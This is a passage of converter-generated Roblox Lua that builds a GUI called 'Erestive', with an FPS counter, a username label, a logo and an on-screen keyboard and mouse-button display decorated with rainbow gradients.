G2L["4e"] = Instance.new("UIListLayout", G2L["4d"]);
G2L["4e"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["4e"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["4e"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.TopInformation.3Frame.TextLabel
G2L["4f"] = Instance.new("TextLabel", G2L["4d"]);
G2L["4f"]["TextWrapped"] = true;
G2L["4f"]["TextStrokeTransparency"] = 0.58;
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["TextSize"] = 14;
G2L["4f"]["TextScaled"] = true;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["BackgroundTransparency"] = 1;
G2L["4f"]["Size"] = UDim2.new(0, 68, 0, 28);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Text"] = [[60 fps]];
G2L["4f"]["Position"] = UDim2.new(0.38492, 0, 0, 0);


-- StarterGui.Erestive.TopInformation.3Frame.TextLabel.FPSFUNCTION
G2L["50"] = Instance.new("LocalScript", G2L["4f"]);
G2L["50"]["Name"] = [[FPSFUNCTION]];


-- StarterGui.Erestive.TopInformation.3Frame.TextLabel.UIPadding
G2L["51"] = Instance.new("UIPadding", G2L["4f"]);
G2L["51"]["PaddingTop"] = UDim.new(0, 2);
G2L["51"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Erestive.TopInformation.3Frame.1Image
G2L["52"] = Instance.new("ImageLabel", G2L["4d"]);
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["52"]["Image"] = [[rbxassetid://85155718601766]];
G2L["52"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["BackgroundTransparency"] = 1;
G2L["52"]["Name"] = [[1Image]];


-- StarterGui.Erestive.TopInformation.3Frame.1Image.UIGradient
G2L["53"] = Instance.new("UIGradient", G2L["52"]);
G2L["53"]["Rotation"] = 123;
G2L["53"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(26, 26, 26)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.TopInformation.1Frame
G2L["54"] = Instance.new("Frame", G2L["43"]);
G2L["54"]["BorderSizePixel"] = 0;
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["Size"] = UDim2.new(0, 126, 0, 28);
G2L["54"]["Position"] = UDim2.new(0.90844, 0, 0, 0);
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Name"] = [[1Frame]];
G2L["54"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.TopInformation.1Frame.LocalScript
G2L["55"] = Instance.new("LocalScript", G2L["54"]);



-- StarterGui.Erestive.TopInformation.1Frame.TextLabel
G2L["56"] = Instance.new("TextLabel", G2L["54"]);
G2L["56"]["TextWrapped"] = true;
G2L["56"]["TextStrokeTransparency"] = 0.58;
G2L["56"]["BorderSizePixel"] = 0;
G2L["56"]["TextSize"] = 14;
G2L["56"]["TextScaled"] = true;
G2L["56"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["56"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["56"]["BackgroundTransparency"] = 1;
G2L["56"]["Size"] = UDim2.new(0, 68, 0, 28);
G2L["56"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["56"]["Text"] = [[user]];
G2L["56"]["Position"] = UDim2.new(0.38492, 0, 0, 0);


-- StarterGui.Erestive.TopInformation.1Frame.TextLabel.script
G2L["57"] = Instance.new("LocalScript", G2L["56"]);
G2L["57"]["Name"] = [[script]];


-- StarterGui.Erestive.TopInformation.1Frame.TextLabel.UIPadding
G2L["58"] = Instance.new("UIPadding", G2L["56"]);
G2L["58"]["PaddingTop"] = UDim.new(0, 2);
G2L["58"]["PaddingBottom"] = UDim.new(0, 2);


-- StarterGui.Erestive.TopInformation.1Frame.UIListLayout
G2L["59"] = Instance.new("UIListLayout", G2L["54"]);
G2L["59"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["59"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["59"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.TopInformation.1Frame.1Image
G2L["5a"] = Instance.new("ImageLabel", G2L["54"]);
G2L["5a"]["BorderSizePixel"] = 0;
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["5a"]["Image"] = [[rbxassetid://99085014908301]];
G2L["5a"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["BackgroundTransparency"] = 1;
G2L["5a"]["Name"] = [[1Image]];


-- StarterGui.Erestive.TopInformation.1Frame.1Image.UIGradient
G2L["5b"] = Instance.new("UIGradient", G2L["5a"]);
G2L["5b"]["Rotation"] = 123;
G2L["5b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(26, 26, 26)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};


-- StarterGui.Erestive.TopInformation.1Frame.AvaTextLabel
G2L["5c"] = Instance.new("ImageLabel", G2L["54"]);
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["5c"]["Image"] = [[rbxassetid://109704029525721]];
G2L["5c"]["Size"] = UDim2.new(0, 30, 0, 30);
G2L["5c"]["Visible"] = false;
G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["BackgroundTransparency"] = 1;
G2L["5c"]["Name"] = [[AvaTextLabel]];


-- StarterGui.Erestive.TopInformation.1Frame.AvaTextLabel.UICorner
G2L["5d"] = Instance.new("UICorner", G2L["5c"]);



-- StarterGui.Erestive.NeverXText
G2L["5e"] = Instance.new("Frame", G2L["1"]);
G2L["5e"]["ZIndex"] = 999999999;
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Name"] = [[NeverXText]];
G2L["5e"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.NeverXText.UIListLayout
G2L["5f"] = Instance.new("UIListLayout", G2L["5e"]);
G2L["5f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["5f"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.Erestive.NeverXText.logo
G2L["60"] = Instance.new("ImageLabel", G2L["5e"]);
G2L["60"]["ZIndex"] = 999999999;
G2L["60"]["BorderSizePixel"] = 0;
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["60"]["Image"] = [[rbxassetid://76705719757703]];
G2L["60"]["Size"] = UDim2.new(0, 50, 0, 50);
G2L["60"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["60"]["BackgroundTransparency"] = 1;
G2L["60"]["Name"] = [[logo]];
G2L["60"]["Position"] = UDim2.new(0.1073, 0, 0.13814, 0);


-- StarterGui.Erestive.NeverXText.logo.LocalScript
G2L["61"] = Instance.new("LocalScript", G2L["60"]);



-- StarterGui.Erestive.NeverXText.logo.UICorner
G2L["62"] = Instance.new("UICorner", G2L["60"]);
G2L["62"]["CornerRadius"] = UDim.new(0, 50);


-- StarterGui.Erestive.NeverXText.logo.dropMessage
G2L["63"] = Instance.new("Frame", G2L["60"]);
G2L["63"]["Visible"] = false;
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(9, 9, 13);
G2L["63"]["Size"] = UDim2.new(3.457, 0, 0.797, 0);
G2L["63"]["Position"] = UDim2.new(0, 0, 1.22, 0);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Name"] = [[dropMessage]];
G2L["63"]["BackgroundTransparency"] = 0.3;


-- StarterGui.Erestive.NeverXText.logo.dropMessage.UIStroke
G2L["64"] = Instance.new("UIStroke", G2L["63"]);
G2L["64"]["Transparency"] = 0.6;
G2L["64"]["Thickness"] = 7;
G2L["64"]["Color"] = Color3.fromRGB(33, 36, 40);


-- StarterGui.Erestive.NeverXText.logo.dropMessage.UICorner
G2L["65"] = Instance.new("UICorner", G2L["63"]);
G2L["65"]["CornerRadius"] = UDim.new(0, 12);


-- StarterGui.Erestive.NeverXText.logo.dropMessage.TextLabel2
G2L["66"] = Instance.new("TextLabel", G2L["63"]);
G2L["66"]["TextWrapped"] = true;
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["TextSize"] = 14;
G2L["66"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["66"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["66"]["TextScaled"] = true;
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Light, Enum.FontStyle.Normal);
G2L["66"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["BackgroundTransparency"] = 1;
G2L["66"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["Text"] = [[Erestive]];
G2L["66"]["Name"] = [[TextLabel2]];


-- StarterGui.Erestive.NeverXText.logo.dropMessage.TextLabel2.UIPadding
G2L["67"] = Instance.new("UIPadding", G2L["66"]);
G2L["67"]["PaddingLeft"] = UDim.new(0, 5);
G2L["67"]["PaddingBottom"] = UDim.new(0, 5);


-- StarterGui.Erestive.NeverXText.UIPadding
G2L["68"] = Instance.new("UIPadding", G2L["5e"]);
G2L["68"]["PaddingTop"] = UDim.new(0, 10);
G2L["68"]["PaddingLeft"] = UDim.new(0, 12);


-- StarterGui.Erestive.NeverXText.blur
G2L["69"] = Instance.new("ImageLabel", G2L["5e"]);
G2L["69"]["ZIndex"] = 999999999;
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["69"]["Image"] = [[rbxassetid://129962492327343]];
G2L["69"]["Size"] = UDim2.new(0, 118, 0, 50);
G2L["69"]["Visible"] = false;
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["BackgroundTransparency"] = 1;
G2L["69"]["Name"] = [[blur]];
G2L["69"]["Position"] = UDim2.new(0.03615, 0, 0, 0);


-- StarterGui.Erestive.NeverXText.blur.UICorner
G2L["6a"] = Instance.new("UICorner", G2L["69"]);
G2L["6a"]["CornerRadius"] = UDim.new(0, 50);


-- StarterGui.Erestive.Keyboard
G2L["6b"] = Instance.new("Frame", G2L["1"]);
G2L["6b"]["Visible"] = false;
G2L["6b"]["ZIndex"] = 999999992;
G2L["6b"]["BorderSizePixel"] = 0;
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(3, 5, 10);
G2L["6b"]["Size"] = UDim2.new(0, 195, 0, 244);
G2L["6b"]["Position"] = UDim2.new(0.68855, 0, 0.0831, 0);
G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["Name"] = [[Keyboard]];
G2L["6b"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.Keyboard.UIDrag
G2L["6c"] = Instance.new("LocalScript", G2L["6b"]);
G2L["6c"]["Name"] = [[UIDrag]];


-- StarterGui.Erestive.Keyboard.UIListLayout
G2L["6d"] = Instance.new("UIListLayout", G2L["6b"]);



-- StarterGui.Erestive.Keyboard.UICorner
G2L["6e"] = Instance.new("UICorner", G2L["6b"]);



-- StarterGui.Erestive.Keyboard.UIPadding
G2L["6f"] = Instance.new("UIPadding", G2L["6b"]);
G2L["6f"]["PaddingTop"] = UDim.new(0, 5);


-- StarterGui.Erestive.Keyboard.ImageLabel
G2L["70"] = Instance.new("ImageLabel", G2L["6b"]);
G2L["70"]["ZIndex"] = -888;
G2L["70"]["BorderSizePixel"] = 0;
G2L["70"]["ScaleType"] = Enum.ScaleType.Crop;
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["70"]["Image"] = [[rbxassetid://129962492327343]];
G2L["70"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["70"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["70"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.Keyboard.ImageLabel.UIListLayout
G2L["71"] = Instance.new("UIListLayout", G2L["70"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.UIPadding
G2L["72"] = Instance.new("UIPadding", G2L["70"]);
G2L["72"]["PaddingTop"] = UDim.new(0, 5);


-- StarterGui.Erestive.Keyboard.ImageLabel.UICorner
G2L["73"] = Instance.new("UICorner", G2L["70"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key4
G2L["74"] = Instance.new("Frame", G2L["70"]);
G2L["74"]["BorderSizePixel"] = 0;
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["Size"] = UDim2.new(1, 0, 0.22094, 0);
G2L["74"]["Position"] = UDim2.new(0, 0, 0.77787, 0);
G2L["74"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["74"]["Name"] = [[Key4]];
G2L["74"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.Keyboard.ImageLabel.Key4.4
G2L["75"] = Instance.new("TextLabel", G2L["74"]);
G2L["75"]["TextWrapped"] = true;
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["TextSize"] = 14;
G2L["75"]["TextScaled"] = true;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["BackgroundTransparency"] = 1;
G2L["75"]["Size"] = UDim2.new(0.99424, 0, 1, 0);
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Text"] = [[▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬]];
G2L["75"]["Name"] = [[4]];
G2L["75"]["Position"] = UDim2.new(0.00288, 0, 0, 0);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key4.4.LocalScript
G2L["76"] = Instance.new("LocalScript", G2L["75"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key4.4.UIStroke
G2L["77"] = Instance.new("UIStroke", G2L["75"]);
G2L["77"]["Enabled"] = false;
G2L["77"]["Thickness"] = 4;
G2L["77"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key4.4.UIStroke.randbows
G2L["78"] = Instance.new("LocalScript", G2L["77"]);
G2L["78"]["Name"] = [[randbows]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key4.4.UIStroke.rainbow
G2L["79"] = Instance.new("UIGradient", G2L["77"]);
G2L["79"]["Rotation"] = -22;
G2L["79"]["Name"] = [[rainbow]];
G2L["79"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.200, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.400, Color3.fromRGB(0, 226, 0)),ColorSequenceKeypoint.new(0.600, Color3.fromRGB(0, 255, 255)),ColorSequenceKeypoint.new(0.800, Color3.fromRGB(0, 0, 226)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 226))};


-- StarterGui.Erestive.Keyboard.ImageLabel.Key4.UIGridLayout
G2L["7a"] = Instance.new("UIGridLayout", G2L["74"]);
G2L["7a"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["7a"]["CellSize"] = UDim2.new(0, 130, 0, 55);
G2L["7a"]["StartCorner"] = Enum.StartCorner.TopRight;


-- StarterGui.Erestive.Keyboard.ImageLabel.Key4.UIPadding
G2L["7b"] = Instance.new("UIPadding", G2L["74"]);
G2L["7b"]["PaddingRight"] = UDim.new(0.01, 0);
G2L["7b"]["PaddingLeft"] = UDim.new(0.01, 0);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3
G2L["7c"] = Instance.new("Frame", G2L["70"]);
G2L["7c"]["BorderSizePixel"] = 0;
G2L["7c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7c"]["Size"] = UDim2.new(1, 0, 0.25654, 0);
G2L["7c"]["Position"] = UDim2.new(0, 0, 0.52133, 0);
G2L["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7c"]["Name"] = [[Key3]];
G2L["7c"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.UIGridLayout
G2L["7d"] = Instance.new("UIGridLayout", G2L["7c"]);
G2L["7d"]["CellSize"] = UDim2.new(0, 90, 0, 60);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.2
G2L["7e"] = Instance.new("TextLabel", G2L["7c"]);
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["BorderSizePixel"] = 0;
G2L["7e"]["TextSize"] = 14;
G2L["7e"]["TextScaled"] = true;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["BackgroundTransparency"] = 1;
G2L["7e"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Text"] = [[LMB]];
G2L["7e"]["Name"] = [[2]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.2.LocalScript
G2L["7f"] = Instance.new("LocalScript", G2L["7e"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.2.LocalScript
G2L["80"] = Instance.new("LocalScript", G2L["7e"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.2.UIStroke
G2L["81"] = Instance.new("UIStroke", G2L["7e"]);
G2L["81"]["Enabled"] = false;
G2L["81"]["Thickness"] = 5;
G2L["81"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.2.UIStroke.randbows
G2L["82"] = Instance.new("LocalScript", G2L["81"]);
G2L["82"]["Name"] = [[randbows]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.2.UIStroke.rainbow
G2L["83"] = Instance.new("UIGradient", G2L["81"]);
G2L["83"]["Rotation"] = -22;
G2L["83"]["Name"] = [[rainbow]];
G2L["83"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.200, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.400, Color3.fromRGB(0, 226, 0)),ColorSequenceKeypoint.new(0.600, Color3.fromRGB(0, 255, 255)),ColorSequenceKeypoint.new(0.800, Color3.fromRGB(0, 0, 226)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 226))};


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.4
G2L["84"] = Instance.new("TextLabel", G2L["7c"]);
G2L["84"]["TextWrapped"] = true;
G2L["84"]["BorderSizePixel"] = 0;
G2L["84"]["TextSize"] = 14;
G2L["84"]["TextScaled"] = true;
G2L["84"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["84"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["84"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["84"]["BackgroundTransparency"] = 1;
G2L["84"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["84"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["84"]["Text"] = [[RMB]];
G2L["84"]["Name"] = [[4]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.4.LocalScript
G2L["85"] = Instance.new("LocalScript", G2L["84"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.4.LocalScript
G2L["86"] = Instance.new("LocalScript", G2L["84"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.4.UIStroke
G2L["87"] = Instance.new("UIStroke", G2L["84"]);
G2L["87"]["Enabled"] = false;
G2L["87"]["Thickness"] = 5;
G2L["87"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.4.UIStroke.randbows
G2L["88"] = Instance.new("LocalScript", G2L["87"]);
G2L["88"]["Name"] = [[randbows]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.4.UIStroke.rainbow
G2L["89"] = Instance.new("UIGradient", G2L["87"]);
G2L["89"]["Rotation"] = -22;
G2L["89"]["Name"] = [[rainbow]];
G2L["89"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.200, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.400, Color3.fromRGB(0, 226, 0)),ColorSequenceKeypoint.new(0.600, Color3.fromRGB(0, 255, 255)),ColorSequenceKeypoint.new(0.800, Color3.fromRGB(0, 0, 226)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 226))};


-- StarterGui.Erestive.Keyboard.ImageLabel.Key3.UIPadding
G2L["8a"] = Instance.new("UIPadding", G2L["7c"]);
G2L["8a"]["PaddingRight"] = UDim.new(0.01, 0);
G2L["8a"]["PaddingLeft"] = UDim.new(0, 5);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2
G2L["8b"] = Instance.new("Frame", G2L["70"]);
G2L["8b"]["BorderSizePixel"] = 0;
G2L["8b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8b"]["Size"] = UDim2.new(1, 0, 0.25654, 0);
G2L["8b"]["Position"] = UDim2.new(0, 0, 0.2648, 0);
G2L["8b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8b"]["Name"] = [[Key2]];
G2L["8b"]["BackgroundTransparency"] = 1;


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.UIGridLayout
G2L["8c"] = Instance.new("UIGridLayout", G2L["8b"]);
G2L["8c"]["CellSize"] = UDim2.new(0, 60, 0, 60);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.3
G2L["8d"] = Instance.new("TextLabel", G2L["8b"]);
G2L["8d"]["TextWrapped"] = true;
G2L["8d"]["BorderSizePixel"] = 0;
G2L["8d"]["TextSize"] = 14;
G2L["8d"]["TextScaled"] = true;
G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["BackgroundTransparency"] = 1;
G2L["8d"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Text"] = [[S]];
G2L["8d"]["Name"] = [[3]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.3.LocalScript
G2L["8e"] = Instance.new("LocalScript", G2L["8d"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.3.UIStroke
G2L["8f"] = Instance.new("UIStroke", G2L["8d"]);
G2L["8f"]["Enabled"] = false;
G2L["8f"]["Thickness"] = 5;
G2L["8f"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.3.UIStroke.randbows
G2L["90"] = Instance.new("LocalScript", G2L["8f"]);
G2L["90"]["Name"] = [[randbows]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.3.UIStroke.rainbow
G2L["91"] = Instance.new("UIGradient", G2L["8f"]);
G2L["91"]["Rotation"] = -22;
G2L["91"]["Name"] = [[rainbow]];
G2L["91"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.200, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.400, Color3.fromRGB(0, 226, 0)),ColorSequenceKeypoint.new(0.600, Color3.fromRGB(0, 255, 255)),ColorSequenceKeypoint.new(0.800, Color3.fromRGB(0, 0, 226)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 226))};


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.2
G2L["92"] = Instance.new("TextLabel", G2L["8b"]);
G2L["92"]["TextWrapped"] = true;
G2L["92"]["BorderSizePixel"] = 0;
G2L["92"]["TextSize"] = 14;
G2L["92"]["TextScaled"] = true;
G2L["92"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["92"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["92"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["92"]["BackgroundTransparency"] = 1;
G2L["92"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["92"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["92"]["Text"] = [[A]];
G2L["92"]["Name"] = [[2]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.2.LocalScript
G2L["93"] = Instance.new("LocalScript", G2L["92"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.2.UIStroke
G2L["94"] = Instance.new("UIStroke", G2L["92"]);
G2L["94"]["Enabled"] = false;
G2L["94"]["Thickness"] = 5;
G2L["94"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.2.UIStroke.randbows
G2L["95"] = Instance.new("LocalScript", G2L["94"]);
G2L["95"]["Name"] = [[randbows]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.2.UIStroke.rainbow
G2L["96"] = Instance.new("UIGradient", G2L["94"]);
G2L["96"]["Rotation"] = -22;
G2L["96"]["Name"] = [[rainbow]];
G2L["96"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(0.200, Color3.fromRGB(255, 255, 0)),ColorSequenceKeypoint.new(0.400, Color3.fromRGB(0, 226, 0)),ColorSequenceKeypoint.new(0.600, Color3.fromRGB(0, 255, 255)),ColorSequenceKeypoint.new(0.800, Color3.fromRGB(0, 0, 226)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 226))};


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.4
G2L["97"] = Instance.new("TextLabel", G2L["8b"]);
G2L["97"]["TextWrapped"] = true;
G2L["97"]["BorderSizePixel"] = 0;
G2L["97"]["TextSize"] = 14;
G2L["97"]["TextScaled"] = true;
G2L["97"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["97"]["FontFace"] = Font.new([[rbxasset://fonts/families/Nunito.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["97"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["97"]["BackgroundTransparency"] = 1;
G2L["97"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["97"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["97"]["Text"] = [[D]];
G2L["97"]["Name"] = [[4]];


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.4.LocalScript
G2L["98"] = Instance.new("LocalScript", G2L["97"]);



-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.4.UIStroke
G2L["99"] = Instance.new("UIStroke", G2L["97"]);
G2L["99"]["Enabled"] = false;
G2L["99"]["Thickness"] = 5;
G2L["99"]["Color"] = Color3.fromRGB(255, 255, 255);


-- StarterGui.Erestive.Keyboard.ImageLabel.Key2.4.UIStroke.randbows
G2L["9a"] = Instance.new("LocalScript", G2L["99"]);
G2L["9a"]["Name"] = [[randbows]];


